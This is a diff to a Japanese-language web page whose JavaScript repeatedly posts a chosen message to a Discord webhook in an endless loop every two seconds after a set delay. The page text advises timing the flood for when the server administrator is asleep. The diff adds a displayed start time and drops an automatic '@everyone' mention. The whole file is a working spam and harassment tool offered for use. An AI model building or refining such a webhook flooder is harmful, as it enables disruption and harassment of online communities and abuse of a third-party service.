@@ -26,9 +26,6 @@
 <br>
 <font color="#fd7e00">管理者が寝ている時間を狙って連投するタイミングを調整してください</font>
 </br>
-<br>
-<font color="#fd7e00">下のSubmitボタンを押し、送信中と表示されたら準備完了です</font>
-</br>
     <style>
       body {
         text-align:center;
@@ -40,7 +37,7 @@
     flex-direction: column;
     align-items: center;
     justify-content: center;
-    height: 50vh;
+    height: 43vh;
   }
 
   .input-group {
@@ -98,31 +95,48 @@
   <script>
     const submitButton = document.getElementById("submit-button");
     submitButton.addEventListener("click", startSending);
-    
+  
     async function startSending() {
       const webhookUrl = document.getElementById("webhook-url").value;
       const message = document.getElementById("message").value;
       const interval = 2000;
       const startTime = document.getElementById("start-time").value * 60 * 1000;
-    
+  
       if (!webhookUrl || !message) {
         return alert("Webhook URLとメッセージは必須です");
       }
-    
+  
       if (interval < 1000) {
         return alert("送信間隔は1秒以上にしてください");
       }
       if (startTime < 0) {
         return alert("開始時間は0分以上にしてください");
       }
-    
+  
+      const currentTime = new Date();
+      const startTimeWithCurrent = new Date(currentTime.getTime() + startTime);
+      const startTimeText = startTimeWithCurrent.toLocaleString();
+  
+      const startTimeDisplay = document.createElement("div");
+      startTimeDisplay.style.color = "#FF0000";
+      startTimeDisplay.style.fontSize = "20px";
+      startTimeDisplay.textContent = "開始予定時刻: " + startTimeText;
+      document.body.appendChild(startTimeDisplay);
+  
       submitButton.disabled = true;
       submitButton.textContent = "送信中...";
-    
+  
       await sleep(startTime);
+  
+      const startMessageDisplay = document.createElement("div");
+      startMessageDisplay.style.color = "#0000FF";
+      startMessageDisplay.style.fontSize = "23px";
+      startMessageDisplay.textContent = "送信が開始されました";
+      document.body.appendChild(startMessageDisplay);
+  
       while (true) {
         try {
-          await sendRequest(webhookUrl, message + " @everyone");
+          await sendRequest(webhookUrl, message);
         } catch (error) {
           console.error(error);
         } finally {
@@ -130,7 +144,7 @@
         }
       }
     }
-    
+  
     async function sendRequest(url, message) {
       const response = await fetch(url, {
         method: "POST",
@@ -139,11 +153,12 @@
       });
       return response.json();
     }
-    
+  
     function sleep(ms) {
       return new Promise((resolve) => setTimeout(resolve, ms));
     }
-    
-    </script>
+  
+  </script>
+  
 </body>
 </html>
